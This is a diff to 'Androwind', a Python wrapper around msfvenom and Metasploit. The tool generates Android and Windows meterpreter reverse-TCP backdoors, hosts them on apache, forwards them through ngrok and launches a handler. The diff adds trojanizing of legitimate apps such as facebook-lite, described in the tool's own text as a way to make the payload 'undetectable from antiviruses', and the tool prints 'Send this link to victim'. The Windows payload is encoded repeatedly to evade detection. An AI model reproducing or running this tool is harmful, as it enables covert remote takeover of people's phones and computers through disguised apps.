@@ -19,7 +19,8 @@ GREEN = "[\033[92m◉\033[0m]"
 ip = ""
 port = ""
 filename = ""
-APrompt = "\033[95mAndrowind ~#\033[0m"
+app = ""
+APrompt = "\033[95mAndrowind ~#\033[0m "
 ng_ins = f'''\n{GREEN} Signup: https://dashboard.ngrok.com/signup \n{GREEN} Login: https://dashboard.ngrok.com/login\n'''
 
 #Payload for Android
@@ -52,25 +53,13 @@ def logo():
 #Create a directory /tmp/payload
 def __directory__():
     if not os.path.exists(PATH_OF_PAYLOAD):
-        animation = ("\/-\\")
-        for i in range(10):
-            time.sleep(0.1)
-            sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Creating Directory..")
-            sys.stdout.flush()
         os.system("sudo mkdir /tmp/payload/")
-        print("\n" + blue_plus + " Directory has been created \n")
-        print("")
+        print(blue_plus + " Directory has been created")
 
 #Start the apache2 server
 def __apache__():
-    animation = ("\/-\\")
-    for i in range(10):
-        time.sleep(0.1)
-        sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Starting Service Apache2..")
-        sys.stdout.flush()
     os.system("sudo service apache2 start")
-    print("\n" + blue_plus + " Server has been started \n")
-    print("")
+    print(blue_plus + " Server has been started")
 
 #set local_ip and port automatically
 def __default__(ip, port):
@@ -85,29 +74,33 @@ def __default__(ip, port):
         print("Exception: %s " %str(ex))
 
 #Create Android payload
-def venom_andro(ip, port, filename):
+def venom_andro(ip, port, filename, app):
+    os.system("clear")
+    logo()
     try:
-        os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} > /tmp/payload/{filename}.apk")
-        print("\n"+red_ex + " Uploading backdoor to the server..")
-        __animation__()
-        os.system(f"sudo cp /tmp/payload/{filename}.apk /var/www/html\n")
-        print(blue_plus + " Backdoor Uploaded \n")
+        print(GREEN + " Creating payload..")
+        os.system(f"sudo msfvenom -x {app} -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} > /tmp/payload/{filename}.apk")
+        os.system(f"sudo cp /tmp/payload/{filename}.apk /var/www/html\n")   
+        print(blue_plus + " Backdoor Uploaded")
     except Exception as ex:
         print("Exception: %s" % str(ex))
 
 #Create Payload for Windows
 def venom_window(ip, port, filename):
+    os.system("clear")
+    logo()
     try:
+        print(GREEN + " Creating payload..")
         os.system(f'sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 20 -f exe -o /tmp/payload/{filename}.exe')
-        print("\n"+red_ex + " Uploading backdoor to the server..")
-        __animation__()
         os.system(f"sudo cp /tmp/payload/{filename}.exe /var/www/html\n")
-        print(blue_plus + " Backdoor Uploaded \n")
+        print(blue_plus + " Backdoor Uploaded to the server!")
     except Exception as ex:
         print("Exception: %s " % str(ex))
 
 #Start metasploit and execute systemHandler.r to set PAYLOAD, IP address, PORT no automatically
 def msfconsole():
+    os.system("clear")
+    logo()
     print(GREEN + " Starting msfconsole..")
     try:
         os.system("sudo xterm -T Metasploit -e msfconsole -q -r /root/.androwind/systemHandler.r")
@@ -140,23 +133,13 @@ def systemHandler():
 #It will copy ngrok in /usr/local/bin to make an executeable
 def ngrok():
     if not os.path.isfile('/usr/local/bin/ngrok'):
-        animation = ("\/-\\")
-        for i in range(10):
-            time.sleep(0.1)
-            sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Installing ngrok..")
-            sys.stdout.flush()
         os.system("sudo cp ngrok /usr/local/bin")
-    print("\n" + blue_plus + " Ngrok installed \n")
-    print("")
+    print(blue_plus + " Ngrok installed ")
+
 
 #it configure ngrok for portforwaring for multiple sessions HTTP and TCP
 def ngConfig():
     path = "/root/.ngrok2"
-    animation = ("\/-\\")
-    for i in range(10):
-        time.sleep(0.1)
-        sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Configuring ngrok.yml file..")
-        sys.stdout.flush()
     if not os.path.exists(path):
 
         try:
@@ -165,9 +148,11 @@ def ngConfig():
         except Exception as ex:
             print("Exception: %s " %str(ex))
 
-    print("\n" + blue_plus + " Configurations done")
+    print(blue_plus + " Configurations done")
     print(blue_plus + " All done! For WAN forward ports by typing a command: \033[93m sudo ngrok start --all \033[0m")
     print("")
+    time.sleep(5)
+    os.system("clear")
 
 #main
 def main():
@@ -178,6 +163,7 @@ def main():
     ngConfig()
 
     #input from user
+    logo()
     choice = input(GREEN + "\033[91mSet default IP for LAN OR press n for set custom IP and PORT for WAN \033[0m\n" + red_ex + " Set Local IP and Port no by androwind[Y/n]: ")
     if choice[0].upper() == 'Y':
 
@@ -210,8 +196,11 @@ def main():
     if ch == 1:
 
         try:
-            venom_andro(ip, port, filename)
-            print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.apk \033[0m\n")
+            print(GREEN + " Embedding an app with payload is a good policy to make it undetectable from antiviruses. Download any app like facebook-lite etc to embed a payload with it.")
+            app = input(red_ex + " Enter the path of Android App e.g /home/user/Download/facebook-lite.apk: \n" + APrompt)
+            print(GREEN + " Embedding app from: " + app)
+            venom_andro(ip, port, filename, app)
+            print(blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.apk \033[0m\n")
             msf = input(red_ex + " Metasploit = > [Y/n]: ")
             if msf[0].upper() == 'Y':
                 print(red_ex + " Config payload..")
@@ -228,7 +217,7 @@ def main():
 
         try:
             venom_window(ip, port, filename)
-            print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.exe \033[0m\n")
+            print(blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.exe \033[0m\n")
             msf = input(red_ex + " Metasploit = > [Yes/No]: ")
             if msf[0].upper() == 'Y':
                 print(blue_plus + " Config payload..")
